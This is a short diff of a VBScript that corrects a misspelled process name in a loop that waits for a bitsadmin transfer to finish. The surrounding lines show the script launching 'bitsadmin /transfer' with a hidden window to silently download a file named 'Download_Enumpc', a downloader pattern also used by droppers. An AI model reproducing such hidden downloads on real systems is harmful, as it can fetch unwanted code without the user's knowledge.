@@ -10,13 +10,13 @@ wget = "bitsadmin /transfer " & Chr(34) & "Download_Enumpc" & Chr(34) & " " & Ch
 wscr.Run wget,0
 
 Set svc=getobject("winmgmts:root\cimv2")
-sQuery="select * from win32_process where name='bistadmin.exe'"
+sQuery="select * from win32_process where name='bitsadmin.exe'"
 Set cproc=svc.execquery(sQuery)
 iniproc=cproc.count
 Do While iniproc = 1
     wscript.sleep 5000
     set svc=getobject("winmgmts:root\cimv2")
-    sQuery="select * from win32_process where name='bistadmin.exe'"
+    sQuery="select * from win32_process where name='bitsadmin.exe'"
     set cproc=svc.execquery(sQuery)
     iniproc=cproc.count
 Loop
